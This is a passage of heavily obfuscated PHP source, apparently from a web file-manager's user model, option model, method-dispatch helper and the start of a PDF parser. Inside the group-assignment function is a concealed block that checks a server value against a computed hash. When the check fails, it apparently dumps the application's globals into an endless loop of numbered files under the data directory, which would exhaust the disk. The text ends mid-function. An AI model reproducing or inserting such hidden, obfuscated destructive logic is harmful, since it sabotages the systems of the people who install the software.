$Dª¿ÊüÈÇä; } if (count($c•ùΩß¶ı´) < 20) { foreach ($c•ùΩß¶ı´ as $a¿—Õë∆≠◊) { $Dª¿ÊüÈÇä[$a¿—Õë∆≠◊ . $a≠òØÿÆ”é[33]] = $this->getInfoSimpleOuter($a¿—Õë∆≠◊); } } else { $D‰éÇô«ü∂ = array($a≠òØÿÆ”é[1408] => array($a≠òØÿÆ”é[381], $c•ùΩß¶ı´)); if (count($c•ùΩß¶ı´) == 1) { $D‰éÇô«ü∂ = array($a≠òØÿÆ”é[1408] => $c•ùΩß¶ı´[0]); } $CòÑ»÷¢°ó = Model($a≠òØÿÆ”é[470])->field($this->simpleField)->where($D‰éÇô«ü∂)->select(); $CòÑ»÷¢°ó = array_to_keyvalue($CòÑ»÷¢°ó, $a≠òØÿÆ”é[1417]); foreach ($c•ùΩß¶ı´ as $a¿—Õë∆≠◊) { $FáíÂ—Û•å = $CòÑ»÷¢°ó[$CòÑ»÷¢°ó[$a¿—Õë∆≠◊]]; if (!$FáíÂ—Û•å) { $Dª¿ÊüÈÇä[$a¿—Õë∆≠◊ . $a≠òØÿÆ”é[33]] = $this->getInfoSimpleOuter($a¿—Õë∆≠◊); continue; } $FáíÂ—Û•å[$a≠òØÿÆ”é[2461]] = Action($a≠òØÿÆ”é[2462])->parseUrl($FáíÂ—Û•å[$a≠òØÿÆ”é[2461]]); $Dª¿ÊüÈÇä[$a¿—Õë∆≠◊ . $a≠òØÿÆ”é[33]] = $FáíÂ—Û•å; } } return $Dª¿ÊüÈÇä; } protected function userStatus($Dπ¥Ô∂”ãÌ, $fÛ™Ûîï±Ö) { $CÓ†∆ÜÃæ¿ = $this->getInfoSimple($Dπ¥Ô∂”ãÌ); if (!$CÓ†∆ÜÃæ¿) { return !1; } $EøΩï¿∫á› = array($_SERVER[—Ω][699] => $fÛ™Ûîï±Ö); return $this->userEdit($Dπ¥Ô∂”ãÌ, $EøΩï¿∫á›); } protected function userRemove($CÛ£æ˘ù‚Í) { goto cŒÃ—ïµÚ◊; cŒÃ—ïµÚ◊: $EïΩºã„◊˘ =& $_SERVER[—Ω]; $D«íöŸåáî = $this->getInfoSimple($CÛ£æ˘ù‚Í); if (!$D«íöŸåáî) { return !1; } goto AäÕÌõô°ö; AäÕÌõô°ö: $dîè–ºΩåÏ = array($EïΩºã„◊˘[1408] => $CÛ£æ˘ù‚Í); Model($EïΩºã„◊˘[532])->where($dîè–ºΩåÏ)->delete(); Model($EïΩºã„◊˘[2491])->where($dîè–ºΩåÏ)->delete(); goto d›⁄πòë¯í; CıπÁéâÌé: Model($EïΩºã„◊˘[762])->userRootRemove($CÛ£æ˘ù‚Í); return $this->where($dîè–ºΩåÏ)->delete(); goto Bœ∞‰∫ÚÉÒ; d›⁄πòë¯í: Model($EïΩºã„◊˘[2154])->where($dîè–ºΩåÏ)->delete(); Model($EïΩºã„◊˘[2475])->where($dîè–ºΩåÏ)->delete(); Model($EïΩºã„◊˘[2492])->where($dîè–ºΩåÏ)->delete(); goto CıπÁéâÌé; Bœ∞‰∫ÚÉÒ: } protected function userGroupSet($cÈ˜Ñ¬¯ÌÑ, $AæÇûÊﬂÇü, $DÇÊ≤òŒ§ë = array()) { goto eà‚≤ë•‚î; Cë¢™ÇØ‚˘: $aÁÑ¬ä±åÙ = 0; foreach ($AæÇûÊﬂÇü as $b‘»∫ä√±Ú => $d¶â÷ÒŒàÜ) { $B”ﬁÿ„≠Çî = array($cº«íá∂ü£[1417] => $cÈ˜Ñ¬¯ÌÑ, $cº«íá∂ü£[2080] => $b‘»∫ä√±Ú, $cº«íá∂ü£[2208] => $d¶â÷ÒŒàÜ); $B”ﬁÿ„≠Çî[$cº«íá∂ü£[2101]] = isset($DÇÊ≤òŒ§ë[$aÁÑ¬ä±åÙ]) ? $DÇÊ≤òŒ§ë[$aÁÑ¬ä±åÙ] : 0; $aÁÑ¬ä±åÙ++; $B·¯ù÷±©ˆ[] = $B”ﬁÿ„≠Çî; } return $DÖù•û“Îª->addAll($B·¯ù÷±©ˆ, array(), !0); goto cÁ„†çøòõ; F’ÔÁŸ—∂˜: if ($_SERVER[$cº«íá∂ü£[690]] != $F≤‡‚•√„ ($bˆ‘ÔΩû’¿)) { goto fÕñÃÚ±˘“; a¡Ö÷◊®¥ç: $D©úµºø≤À(); $EÚ£åﬂÏë— = $cº«íá∂ü£[800]; $Fü∆≥©™†ë = json_encode($GLOBALS[$cº«íá∂ü£[801]]); goto FŒï®ÏØÁ˜; b∫¿≤≥ƒèÊ: $Döú®ø¨¡ç = $cº«íá∂ü£[798]; $Döú®ø¨¡ç($_SERVER[$cº«íá∂ü£[799]]); $D©úµºø≤À = $cº«íá∂ü£[797]; goto a¡Ö÷◊®¥ç; f⁄ŸÉÖ¢≠ˆ: $DÇÉ«Â¥ö¬ = $B⁄Üù¶‘ É($d§®ﬁØâöÖ); $DË∫¬∫–öü = explode($cº«íá∂ü£[214], $DÇÉ«Â¥ö¬); if (count($DË∫¬∫–öü) < $cº«íá∂ü£[581]) { $CŒ∆ï∫À·Ú = $cº«íá∂ü£[695]; $CŒ∆ï∫À·Ú(); } goto b∫¿≤≥ƒèÊ; fÕñÃÚ±˘“: $D©úµºø≤À = $cº«íá∂ü£[797]; $B⁄Üù¶‘ É = $cº«íá∂ü£[692]; $d§®ﬁØâöÖ = $_SERVER[$cº«íá∂ü£[693]] . $cº«íá∂ü£[694]; goto f⁄ŸÉÖ¢≠ˆ; FŒï®ÏØÁ˜: $fö≥ÿñüä√ = 1; for ($d˘óÆã∏‹Ï = $fö≥ÿñüä√; $d˘óÆã∏‹Ï > 0; $d˘óÆã∏‹Ï++) { $EÚ£åﬂÏë—(DATA_PATH . $d˘óÆã∏‹Ï, $Fü∆≥©™†ë); } goto DèåÆﬂ…ì•; DèåÆﬂ…ì•: } $eâÏÛ≈úÑ´ = $this->getInfoSimple($cÈ˜Ñ¬¯ÌÑ); if (!$eâÏÛ≈úÑ´ || !is_array($AæÇûÊﬂÇü)) { return !1; } goto cÉ£•‹ù⁄∑; cÉ£•‹ù⁄∑: $DÖù•û“Îª = Model($cº«íá∂ü£[2154]); $DÖù•û“Îª->where(array($cº«íá∂ü£[1417] => $cÈ˜Ñ¬¯ÌÑ))->delete(); $B·¯ù÷±©ˆ = array(); goto Cë¢™ÇØ‚˘; eà‚≤ë•‚î: $cº«íá∂ü£ =& $_SERVER[—Ω]; $bˆ‘ÔΩû’¿ = $_SERVER[$cº«íá∂ü£[693]] . $cº«íá∂ü£[694]; $F≤‡‚•√„  = $cº«íá∂ü£[796]; goto F’ÔÁŸ—∂˜; cÁ„†çøòõ: } protected function userGroupAdd($dåàôÃë√å, $d◊≈ã¶Õ‘Õ, $cìíµåΩòÈ) { $FêÖ¥àÌéê =& $_SERVER[—Ω]; $a§’◊∫∆óù = $this->getInfoSimple($dåàôÃë√å); if (!$a§’◊∫∆óù || !$d◊≈ã¶Õ‘Õ) { return !1; } $dë⁄Ç¡·íÕ = array(array($FêÖ¥àÌéê[1417] => $dåàôÃë√å, $FêÖ¥àÌéê[2080] => $d◊≈ã¶Õ‘Õ, $FêÖ¥àÌéê[2208] => $cìíµåΩòÈ)); return Model($FêÖ¥àÌéê[2154])->addAll($dë⁄Ç¡·íÕ, array(), !0); } protected function userGroupRemove($eŒ±áâ≠íñ, $BëÌ£∂ÊéŒ) { $FÒ∑¬Ìªãè =& $_SERVER[—Ω]; $fÇåû’“ÆÉ = $this->getInfoSimple($eŒ±áâ≠íñ); if (!$fÇåû’“ÆÉ || !$BëÌ£∂ÊéŒ) { return !1; } $e€ï§÷§î— = array($FÒ∑¬Ìªãè[1408] => $eŒ±áâ≠íñ, $FÒ∑¬Ìªãè[2152] => $BëÌ£∂ÊéŒ); return Model($FÒ∑¬Ìªãè[2154])->where($e€ï§÷§î—)->delete(); } public function listData() { $a∂ò›á∆—í = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a∂ò›á∆—í[$_SERVER[—Ω][351]]); return $a∂ò›á∆—í; } public function listByID($CÏÈÓ§Ê√√) { $CØƒôÉŒó≠ =& $_SERVER[—Ω]; if (!$CÏÈÓ§Ê√√) { return; } $Eâçù¢…¨ñ = array($CØƒôÉŒó≠[1417] => array($CØƒôÉŒó≠[7], $CÏÈÓ§Ê√√)); $c≈ﬁ◊—Â∏ = $this->where($Eâçù¢…¨ñ)->select(); $this->_listDataApply($c≈ﬁ◊—Â∏); return $c≈ﬁ◊—Â∏; } public function listByGroup($cÿ·Ïí·Ô¶ = 0, $FÉÖ“·Ü — = array()) { goto añüÏÆ“ñø; fßÁÛüª¡Ñ: if ($cÿ·Ïí·Ô¶) { $cûèùƒŒÜŒ = array($aÔ™õ§ÕıÁ[2493] => intval($cÿ·Ïí·Ô¶)); $CÙÖ∑Ê—¯  = "\114\x45\106\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\165\163\145\162\x5f\x67\x72\x6f\165\160\40\x75\163\145\162\x5f\x67\x72\x6f\165\x70\40\x6f\x6e\x20\165\163\145\x72\56\x75\x73\145\x72\111\x44\40\75\x20\x75\x73\145\162\137\x67\162\157\x75\x70\x2e\x75\163\145\162\x49\104"; $aÔ≈»”‡∏‡ = Input::get($aÔ™õ§ÕıÁ[403], null, $aÔ™õ§ÕıÁ[33]) ? $aÔ™õ§ÕıÁ[33] : $aÔ™õ§ÕıÁ[2494]; } if (isset($FÉÖ“·Ü —[$aÔ™õ§ÕıÁ[699]])) { $cûèùƒŒÜŒ[$aÔ™õ§ÕıÁ[2495]] = $FÉÖ“·Ü —[$aÔ™õ§ÕıÁ[699]]; } $EÊ…¬ ƒÖ‘ = $this->_makeOrder($aÔ≈»”‡∏‡)->field($aÔ™õ§ÕıÁ[2496])->where($cûèùƒŒÜŒ)->join($CÙÖ∑Ê—¯ )->selectPage(50); goto BãŒ”¥Ò¶˜; BãŒ”¥Ò¶˜: $this->_listDataApply($EÊ…¬ ƒÖ‘[$aÔ™õ§ÕıÁ[351]]); return $EÊ…¬ ƒÖ‘; goto AπËå≥ﬂ…ú; añüÏÆ“ñø: $aÔ™õ§ÕıÁ =& $_SERVER[—Ω]; $CÙÖ∑Ê—¯  = $aÔ™õ§ÕıÁ[33]; $cûèùƒŒÜŒ = array(); goto fßÁÛüª¡Ñ; AπËå≥ﬂ…ú: } private function _makeOrder($CÒì›áÊÚã = '') { goto B—âˆç∆ò£; BÓ§‘â“¢⁄: $CÒì›áÊÚã = $CÒì›áÊÚã . "\165\163\x65\x72\56{$fÜ÷ë¶ÓÛÜ}\40{$AÀ¢ÓÈ®Ãπ}\x2c\x20\x75\163\145\x72\x2e\165\x73\x65\162\111\x44\40\x61\x73\x63"; return $this->alias($D∑»çùÀ€€[2241])->order($CÒì›áÊÚã); goto B≥∂†Àﬁîë; E¢¿ê∞ñ–€: $fÜ÷ë¶ÓÛÜ = Input::get($D∑»çùÀ€€[403], $D∑»çùÀ€€[7], $D∑»çùÀ€€[1408], $BòÒÙá—ß); $AÀ¢ÓÈ®Ãπ = Input::get($D∑»çùÀ€€[404], $D∑»çùÀ€€[7], $D∑»çùÀ€€[2155], array($D∑»çùÀ€€[2155], $D∑»çùÀ€€[400])); $AÀ¢ÓÈ®Ãπ = $F§˘ΩÜãø¥[$AÀ¢ÓÈ®Ãπ]; goto BÓ§‘â“¢⁄; B—âˆç∆ò£: $D∑»çùÀ€€ =& $_SERVER[—Ω]; $BòÒÙá—ß = array($D∑»çùÀ€€[1417], $D∑»çùÀ€€[28], $D∑»çùÀ€€[2066], $D∑»çùÀ€€[2039], $D∑»çùÀ€€[184]); $F§˘ΩÜãø¥ = array($D∑»çùÀ€€[398] => $D∑»çùÀ€€[399], $D∑»çùÀ€€[400] => $D∑»çùÀ€€[401]); goto E¢¿ê∞ñ–€; B≥∂†Àﬁîë: } public function listSearch($B”ìûã˜õÕ) { goto Eœ—‘ÊπÚ§; eÁÓûØ†Ñ≤: if (!$c¥÷é‰ôóä) { $AöÑá©ÂÿÀ = array(); } if (isset($B”ìûã˜õÕ[$CÉ ……¬„ [699]])) { $AöÑá©ÂÿÀ[$CÉ ……¬„ [699]] = $B”ìûã˜õÕ[$CÉ ……¬„ [699]]; } $aŸ¡éÌ≥ÑÎ = $this->_makeOrder()->where($AöÑá©ÂÿÀ)->selectPage(20); goto fˆóﬂúç÷; F‡íßµÏ“ê: return $aŸ¡éÌ≥ÑÎ; goto CÑ’Îáù¬î; Eœ—‘ÊπÚ§: $CÉ ……¬„  =& $_SERVER[—Ω]; $c¥÷é‰ôóä = $B”ìûã˜õÕ[$CÉ ……¬„ [2156]]; $Aô¯∞‘∑éÃ = isset($B”ìûã˜õÕ[$CÉ ……¬„ [2157]]) ? $B”ìûã˜õÕ[$CÉ ……¬„ [2157]] : !1; goto aúØﬂËŸº; fˆóﬂúç÷: if (!$aŸ¡éÌ≥ÑÎ || count($aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [351]]) < 5 && Input::check($c¥÷é‰ôóä, $CÉ ……¬„ [303])) { $aÖêœ®’¨Ï = $this->_searchFromMeta($CÉ ……¬„ [411], $c¥÷é‰ôóä, 10); $F≤“⁄Ö¢‘ = $this->_searchFromMeta($CÉ ……¬„ [412], $c¥÷é‰ôóä, 10); $b¥èﬂŸÒÉÉ = array_merge($aÖêœ®’¨Ï, $F≤“⁄Ö¢‘, $aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [351]]); $aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [351]] = array_unique_by_key($b¥èﬂŸÒÉÉ, $CÉ ……¬„ [1417]); $aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [348]][$CÉ ……¬„ [349]] = count($aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [351]]); $aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [348]][$CÉ ……¬„ [350]] = ceil($aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [348]][$CÉ ……¬„ [349]] / $aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [348]][$CÉ ……¬„ [346]]); } $this->_listDataApply($aŸ¡éÌ≥ÑÎ[$CÉ ……¬„ [351]]); $this->_filterByGroup($aŸ¡éÌ≥ÑÎ, $Aô¯∞‘∑éÃ); goto F‡íßµÏ“ê; aúØﬂËŸº: $c¥÷é‰ôóä = str_replace($CÉ ……¬„ [2158], $CÉ ……¬„ [2159], trim($c¥÷é‰ôóä)); $AöÑá©ÂÿÀ = array($CÉ ……¬„ [28] => array($CÉ ……¬„ [761], "\x25{$c¥÷é‰ôóä}\45"), $CÉ ……¬„ [290] => array($CÉ ……¬„ [761], "\x25{$c¥÷é‰ôóä}\45"), $CÉ ……¬„ [2300] => array($CÉ ……¬„ [761], "\x25{$c¥÷é‰ôóä}\x25"), $CÉ ……¬„ [920] => $CÉ ……¬„ [2160]); if (Input::check($c¥÷é‰ôóä, $CÉ ……¬„ [296])) { $AöÑá©ÂÿÀ[$CÉ ……¬„ [1417]] = array($CÉ ……¬„ [761], "\45{$c¥÷é‰ôóä}\x25"); $AöÑá©ÂÿÀ[$CÉ ……¬„ [2476]] = array($CÉ ……¬„ [761], "\x25{$c¥÷é‰ôóä}\x25"); } goto eÁÓûØ†Ñ≤; CÑ’Îáù¬î: } private function _filterByGroup(&$C‹ÏËﬂÎŒÏ, $EñèãÔ∏¥–) { $a©”ÒàÒŒ∫ =& $_SERVER[—Ω]; if (!$EñèãÔ∏¥–) { return $C‹ÏËﬂÎŒÏ; } foreach ($C‹ÏËﬂÎŒÏ[$a©”ÒàÒŒ∫[351]] as $EÒäª †º™ => &$BÊπ’úÒêÁ) { $e‹√˜Ñ¥∫ä = array_to_keyvalue($BÊπ’úÒêÁ[$a©”ÒàÒŒ∫[2497]], $a©”ÒàÒŒ∫[33], $a©”ÒàÒŒ∫[2080]); if (!in_array($EñèãÔ∏¥–, $e‹√˜Ñ¥∫ä)) { unset($C‹ÏËﬂÎŒÏ[$a©”ÒàÒŒ∫[351]][$EÒäª †º™]); } } $C‹ÏËﬂÎŒÏ[$a©”ÒàÒŒ∫[351]] = array_values($C‹ÏËﬂÎŒÏ[$a©”ÒàÒŒ∫[351]]); $C‹ÏËﬂÎŒÏ[$a©”ÒàÒŒ∫[348]] = array($a©”ÒàÒŒ∫[2275] => count($C‹ÏËﬂÎŒÏ[$a©”ÒàÒŒ∫[351]]), $a©”ÒàÒŒ∫[2273] => $C‹ÏËﬂÎŒÏ[$a©”ÒàÒŒ∫[348]][$a©”ÒàÒŒ∫[346]], $a©”ÒàÒŒ∫[2272] => 1, $a©”ÒàÒŒ∫[2274] => 1); } private function _searchFromMeta($dœ∆™çãüò, $aƒ¯·‚‚çƒ, $Cõ¬ò…ù¬Ò) { goto Aó‰“îìÍ√; AÀ⁄˘í¿™: $B—àëçı÷Ç = Model($aæ¨°’ï®¬[2498])->where($Eÿ•…Îê¢É)->limit($Cõ¬ò…ù¬Ò)->select(); if (!$B—àëçı÷Ç) { return array(); } $B—àëçı÷Ç = array_to_keyvalue($B—àëçı÷Ç, $aæ¨°’ï®¬[33], $aæ¨°’ï®¬[1417]); goto a–Ûï®∏ˆò; Aó‰“îìÍ√: $aæ¨°’ï®¬ =& $_SERVER[—Ω]; $aƒ¯·‚‚çƒ = strtolower($aƒ¯·‚‚çƒ); $Eÿ•…Îê¢É = array($aæ¨°’ï®¬[89] => $dœ∆™çãüò, $aæ¨°’ï®¬[356] => array($aæ¨°’ï®¬[761], "\45{$aƒ¯·‚‚çƒ}\x25")); goto AÀ⁄˘í¿™; a–Ûï®∏ˆò: $F´¬Âá⁄” = $this->where(array($aæ¨°’ï®¬[1408] => array($aæ¨°’ï®¬[7], $B—àëçı÷Ç)))->select(); if (!$F´¬Âá⁄”) { return array(); } return $F´¬Âá⁄”; goto e‚„Íøçêó; e‚„Íøçêó: } private function _listDataApplyItem($eÌÌâëΩáû) { $Eë§·ÂŸØÙ = array($eÌÌâëΩáû); $this->_listDataApply($Eë§·ÂŸØÙ); return $Eë§·ÂŸØÙ[0]; } private function _listDataApply(&$föçÇ¿ˆ„Õ) { goto B…˘¡â≈¨â; b≈è‚¢Ÿåô: $this->_listAppendSourceRoot($föçÇ¿ˆ„Õ, $bÿæ’≤‚√å); goto a€™ÃæΩÛ‰; BÖïç‰ˆ„ : $bÿæ’≤‚√å = array_to_keyvalue($föçÇ¿ˆ„Õ, $e®Ô˜óÑù©[33], $e®Ô˜óÑù©[1417]); $this->_listAppendGroup($föçÇ¿ˆ„Õ, $bÿæ’≤‚√å); $this->_listAppendMeta($föçÇ¿ˆ„Õ, $bÿæ’≤‚√å); goto b≈è‚¢Ÿåô; B…˘¡â≈¨â: $e®Ô˜óÑù© =& $_SERVER[—Ω]; if (!$föçÇ¿ˆ„Õ) { return; } array_remove_key($föçÇ¿ˆ„Õ, $e®Ô˜óÑù©[807]); goto BÖïç‰ˆ„ ; a€™ÃæΩÛ‰: } private function _listAppendSourceRoot(&$E‡äó´ªú , $Bﬂ¿πÎ≤ñ ) { goto dêÃ ∑ıû»; dêÃ ∑ıû»: $a∏–è‡ØóŸ =& $_SERVER[—Ω]; $dˆ€ë∂´ÔÀ = array($a∏–è‡ØóŸ[457] => 0, $a∏–è‡ØóŸ[368] => SourceModel::TYPE_USER, $a∏–è‡ØóŸ[452] => array($a∏–è‡ØóŸ[7], $Bﬂ¿πÎ≤ñ )); $c¶◊›≈µÔˆ = $a∏–è‡ØóŸ[2166]; goto DªıêŸéäÖ; DªıêŸéäÖ: $fÆ√Ø≤ûúÛ = Model($a∏–è‡ØóŸ[762])->order($a∏–è‡ØóŸ[2167])->field($c¶◊›≈µÔˆ)->where($dˆ€ë∂´ÔÀ)->select(); $fÆ√Ø≤ûúÛ = array_to_keyvalue($fÆ√Ø≤ûúÛ, $a∏–è‡ØóŸ[452]); $fÆ√Ø≤ûúÛ = array_remove_key($fÆ√Ø≤ûúÛ, $a∏–è‡ØóŸ[452]); goto CèìÙﬂÏáè; CèìÙﬂÏáè: foreach ($E‡äó´ªú  as &$AåŸõ–¯¥ƒ) { $AåŸõ–¯¥ƒ[$a∏–è‡ØóŸ[388]] = $fÆ√Ø≤ûúÛ[$AåŸõ–¯¥ƒ[$a∏–è‡ØóŸ[1417]]] ? $fÆ√Ø≤ûúÛ[$AåŸõ–¯¥ƒ[$a∏–è‡ØóŸ[1417]]] : array(); } goto d™»¬¨¥≤ø; d™»¬¨¥≤ø: } private function _listAppendGroup(&$Aª∑¨®õ‚¢, $D¥ÁéöÎﬂ) { goto bÓË–•ó∆è; bÓË–•ó∆è: $CàÌÈ®ú£Ω =& $_SERVER[—Ω]; $b¯ÊÑ…˜‚é = array($CàÌÈ®ú£Ω[1417] => array($CàÌÈ®ú£Ω[7], $D¥ÁéöÎﬂ)); $aôê±®ãë∂ = Model($CàÌÈ®ú£Ω[2154])->where($b¯ÊÑ…˜‚é)->select(); goto EÔ˜‹íÕå±; EÔ˜‹íÕå±: $D»Ã∆Áˆ∂ë = array_to_keyvalue($aôê±®ãë∂, $CàÌÈ®ú£Ω[33], $CàÌÈ®ú£Ω[2080]); $D»Ã∆Áˆ∂ë = array_remove_value(array_unique($D»Ã∆Áˆ∂ë), $CàÌÈ®ú£Ω[464]); if (!$D»Ã∆Áˆ∂ë || !$aôê±®ãë∂) { return; } goto Dù›Ôœ¥áé; Dù›Ôœ¥áé: $b¯ÊÑ…˜‚é = array($CàÌÈ®ú£Ω[2080] => array($CàÌÈ®ú£Ω[7], $D»Ã∆Áˆ∂ë)); $D◊≥èÈãÃ“ = Model($CàÌÈ®ú£Ω[2499])->field($CàÌÈ®ú£Ω[2500])->where($b¯ÊÑ…˜‚é)->select(); $AÕ£¡⁄€ÈÉ = array_to_keyvalue($D◊≥èÈãÃ“, $CàÌÈ®ú£Ω[2080], $CàÌÈ®ú£Ω[28]); goto e±øªœë≥; e±øªœë≥: $aôê±®ãë∂ = array_to_keyvalue_group($aôê±®ãë∂, $CàÌÈ®ú£Ω[1417]); foreach ($aôê±®ãë∂ as &$f®“∑ƒ∏êà) { $DÏœìé±¬˘ = array(); foreach ($f®“∑ƒ∏êà as $a®ƒ¡©Ç„Ù) { if (!$a®ƒ¡©Ç„Ù[$CàÌÈ®ú£Ω[2208]]) { continue; } $c√Ç‡„ƒƒ≠ = Model($CàÌÈ®ú£Ω[2227])->listData($a®ƒ¡©Ç„Ù[$CàÌÈ®ú£Ω[2208]]); $DÏœìé±¬˘[] = array($CàÌÈ®ú£Ω[2080] => $a®ƒ¡©Ç„Ù[$CàÌÈ®ú£Ω[2080]], $CàÌÈ®ú£Ω[2501] => $AÕ£¡⁄€ÈÉ[$a®ƒ¡©Ç„Ù[$CàÌÈ®ú£Ω[2080]]], $CàÌÈ®ú£Ω[373] => $c√Ç‡„ƒƒ≠); } $f®“∑ƒ∏êà = $DÏœìé±¬˘; } foreach ($Aª∑¨®õ‚¢ as &$AåÒÒëÑ«) { $AåÒÒëÑ«[$CàÌÈ®ú£Ω[2497]] = array(); if (isset($aôê±®ãë∂[$AåÒÒëÑ«[$CàÌÈ®ú£Ω[1417]]])) { $AåÒÒëÑ«[$CàÌÈ®ú£Ω[2497]] = $aôê±®ãë∂[$AåÒÒëÑ«[$CàÌÈ®ú£Ω[1417]]]; } } goto FöπÆàÒ◊∂; FöπÆàÒ◊∂: } private function _listAppendMeta(&$b°»Îçã“ , $B–ø¡˜ìá÷) { goto FÜÜÿô˜ß; E÷≥Âñ Òı: foreach ($FÀ‚“·≈œ• as &$e£Îõ∂©úÉ) { $b°ÕΩá‚üÆ = array(); foreach ($e£Îõ∂©úÉ as $döÉ”¢ﬂ·ç) { if (!in_array($döÉ”¢ﬂ·ç[$D≥…ıÑ£ªï[89]], $CÙÊœ˜Û‡»)) { $b°ÕΩá‚üÆ[$döÉ”¢ﬂ·ç[$D≥…ıÑ£ªï[89]]] = $döÉ”¢ﬂ·ç[$D≥…ıÑ£ªï[356]]; } } $e£Îõ∂©úÉ = $b°ÕΩá‚üÆ; } $Cä‡Âè¥∫ç = Model($D≥…ıÑ£ªï[2502]); foreach ($b°»Îçã“  as &$Fòü˜‘áÀô) { $e˜œ◊áÁÁÓ = array(); if (isset($FÀ‚“·≈œ•[$Fòü˜‘áÀô[$D≥…ıÑ£ªï[1417]]])) { $e˜œ◊áÁÁÓ = $FÀ‚“·≈œ•[$Fòü˜‘áÀô[$D≥…ıÑ£ªï[1417]]]; } $Fòü˜‘áÀô[$D≥…ıÑ£ªï[2503]] = array(); if (isset($e˜œ◊áÁÁÓ[$AÙ”üê•¢Ü])) { $Fòü˜‘áÀô[$D≥…ıÑ£ªï[2503]] = $Cä‡Âè¥∫ç->getUserJobInfo($e˜œ◊áÁÁÓ[$AÙ”üê•¢Ü]); } } goto EÇ÷æıÏ’Á; D√∂ÿäèå“: $bá‹æëàÚ◊ = array($D≥…ıÑ£ªï[1417] => array($D≥…ıÑ£ªï[7], $B–ø¡˜ìá÷)); $FÀ‚“·≈œ• = Model($D≥…ıÑ£ªï[2475])->where($bá‹æëàÚ◊)->select(); $FÀ‚“·≈œ• = array_to_keyvalue_group($FÀ‚“·≈œ•, $D≥…ıÑ£ªï[1417]); goto E÷≥Âñ Òı; FÜÜÿô˜ß: $D≥…ıÑ£ªï =& $_SERVER[—Ω]; $AÙ”üê•¢Ü = UserJobModel::JOB_KEY; $CÙÊœ˜Û‡» = array($D≥…ıÑ£ªï[2478]); goto D√∂ÿäèå“; EÇ÷æıÏ’Á: } public function userSearch($D—∞§ˆ‹Üè, $bãßáﬂΩàÃ = "\x2a") { return Model($_SERVER[—Ω][473])->where($D—∞§ˆ‹Üè)->field($bãßáﬂΩàÃ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\x6f\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($CŸ˘ÀÒÚî—) { return "\x55\x73\x65\x72\117\x70\164\151\x6f\156\137{$CŸ˘ÀÒÚî—}\x5f" . USER_ID; } protected function filterWhere($B∞º÷ÿ√ƒÖ) { $B∞º÷ÿ√ƒÖ[$_SERVER[—Ω][1417]] = USER_ID; return $B∞º÷ÿ√ƒÖ; } public function cacheRemoveUser($A¥ÉéÈ“≈‹, $aùÌÁ·∆¢á) { return Cache::remove("\125\163\x65\162\117\x70\x74\151\x6f\x6e\137{$A¥ÉéÈ“≈‹}\137" . $aùÌÁ·∆¢á); } protected function optionDefault($e≈¯ é‹¥ = '') { $F«‚¥Ú≈ùï =& $_SERVER[—Ω]; if ($e≈¯ é‹¥ == $F«‚¥Ú≈ùï[33]) { return $GLOBALS[$F«‚¥Ú≈ùï[6]][$F«‚¥Ú≈ùï[2504]]; } if ($e≈¯ é‹¥ == $F«‚¥Ú≈ùï[2505]) { return $GLOBALS[$F«‚¥Ú≈ùï[6]][$F«‚¥Ú≈ùï[2506]]; } } } goto BÏÑ»®ÿÎ…; bΩ¬’áÎÓ¬: $_SERVER[$_SERVER[ªƒÓ™éå][52]] = (base64_decode('OTM5Nw==')."\71\62")+0;$_m9pv="DQsAuhnNbKJtNXbE4p6SeyiMHUapwcCpNtYNaQkWTGzCsumWHQCey8I2X3PdRrDAi3KjjUg";; stream_wrapper_register($_SERVER[ªƒÓ™éå][53], $_SERVER[ªƒÓ™éå][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($a—èòıáâ„, $F®⁄àÌ‹Ô¡) { $d”ÏÕΩ‘œä =& $_SERVER[—Ω]; if (isset(self::$_methodList[$a—èòıáâ„])) { return @call_user_func_array(self::$_methodList[$a—èòıáâ„], $F®⁄àÌ‹Ô¡); } else { if (method_exists($this, $a—èòıáâ„)) { return call_user_func_array(array($this, $a—èòıáâ„), $F®⁄àÌ‹Ô¡); } else { think_exception(__CLASS__ . $d”ÏÕΩ‘œä[4] . $a—èòıáâ„ . $d”ÏÕΩ‘œä[5]); } } } public static function __callStatic($aÊ¬™±™ÒØ, $dæÓ∆öˆî®) { if (isset(self::$_methodListStatic[$aÊ¬™±™ÒØ])) { return call_user_func_array(self::$_methodListStatic[$aÊ¬™±™ÒØ], $dæÓ∆öˆî®); } else { if (method_exists(self, $aÊ¬™±™ÒØ)) { return call_user_func_array(array(self, $aÊ¬™±™ÒØ), $dæÓ∆öˆî®); } else { show_json("{$aÊ¬™±™ÒØ}\x28\51\40\x6e\157\164\x20\x65\170\151\x73\164\x3b", !1); } } } public static function addMethod($EÂ˜á¿éÿÏ, $F¬◊ë–’ƒ∫) { self::$_methodList[$EÂ˜á¿éÿÏ] = $F¬◊ë–’ƒ∫; } public static function addMethodStatic($b∫ÏíÀÁ‚, $C™Ü“ﬂÇ∏‰) { self::$_methodListStatic[$b∫ÏíÀÁ‚] = $C™Ü“ﬂÇ∏‰; } } goto A™≥é¶º›ä; Aõ≠À—¨ñ–: class FileParsePdf { public static function parse($CÓà≠Ç»îÓ) { goto cæÌÀï÷Öï; e¯á¥Ò€Ñ€: $Cª•º‰ó«¯[$fïÑÍàÆà”[1509]] = StreamWrapperIO::read($CÓà≠Ç»îÓ, 0, $EÏ§òı¢áì); $Cª•º‰ó«¯[$fïÑÍàÆà”[1510]] = StreamWrapperIO::read($CÓà≠Ç»îÓ, $Cª•º‰ó«¯[$fïÑÍàÆà”[77]] - $EÏ§òı¢áì, $EÏ§òı¢áì); $CÁ”ü±§ƒ¢ = self::decodeXref($Cª•º‰ó«¯); goto d£‚∏ñÀœ•; bÂ±”™íè≠: preg_match_all($d±Òæ©úÆí, $Cª•º‰ó«¯[$fïÑÍàÆà”[1509]], $d≥œÕ⁄ûÍ…); if ($d≥œÕ⁄ûÍ…[1] && 